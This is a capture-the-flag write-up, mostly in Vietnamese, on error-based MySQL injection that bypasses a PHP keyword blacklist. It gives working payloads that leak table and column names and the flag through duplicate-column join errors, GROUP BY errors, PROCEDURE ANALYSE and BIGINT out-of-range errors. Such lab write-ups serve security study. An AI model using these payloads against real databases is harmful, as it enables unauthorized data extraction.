# Error based MySql injection "heavy blacklists"

```php
if (preg_match('/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extractxml|xml|betweent|count|column|sleep|benchmark|\<|\>|\=/is', $_GET['id'])){
	die('...');
}
else{
	// .....
	if(!$run_query) {
		echo mysqli_error($conn);
	}
	else{
		// .....
	}
}
```

## Intended

### MySQL limit double column error
Ta biết trước table_name là `flag_here_hihi`, có 3 column(.,.,.)
```sql
?id=1*(select * (select * from flag_here_hihi as a join flag_here_hihi as b using(id)) as c)
```
- Ta không thể join 2 bảng cùng tên với nhau nên ta cần đổi tên và join lại thành 1 bảng. Sau khi join ta có bảng c với 6 columns
- Vì ta không biết tên column cần query nên ta `select *`, khi query hit colunm đầu tiên thì không thể lấy bởi mysql thấy có 2 column duplicate nên báo lỗi tên column thứ nhất -> ta được `id` column.
- Để lấy tên column tiếp theo, ta dùng `using(id)` có tác dụng concat 2 column id trùng nhau lại với nhau thể nên khi tiếp tục `select *`, id column không còn lỗi dính lỗi duplicate đến column thứ 2 lại duplicate --> báo lỗi với tên column thứ 2 chính là `t_fl4g_name_su` ... tương tự ta được column thứ 3 `t_fl4g_v3lue_su`.


Có table_name, column_name --> flag

## Uninteded

### group by id
MySQL version >= 5.7.5
**dump columns**
```sql
?id=1 group by id
```
Group results thành các nhóm với nhiều thuộc tính sau đó lấy 1 thuộc tính từ group đó, tuy nhiên nhóm vừa group có nhiều thuộc tính nên mysql không biết lấy thuộc tính nào ==> dump error

### typo - procedure analyse
```sql
?id=1 limit 2,1 procedure analyse(1);
```
analyse column thứ 2(chứa flag)

### Out of range 
Vì ~0 là bigest int number --> ~0 + 1 --> mysql number out of range --> display error results

**query dump columns trong table**:
```sql
?id=1*(select ~0 + ( select 1 from (select * from flag_here_hihi limit 1 ) as a))
# BIGINT UNSIGNED value is out of range in '......'
```

- `1*(select ~0 + ( select 1 from flag_here_hihi limit 1 )` trả về error tên table mà sinh ra error
- 
- `1*(select ~0 + ( select 1 from (select * from flag_here_hihi limit 1 ) as a)` trả về error tên columns từ bảng flag_here_hihi sinh ra error(không phải tên a mà chính là các columns)
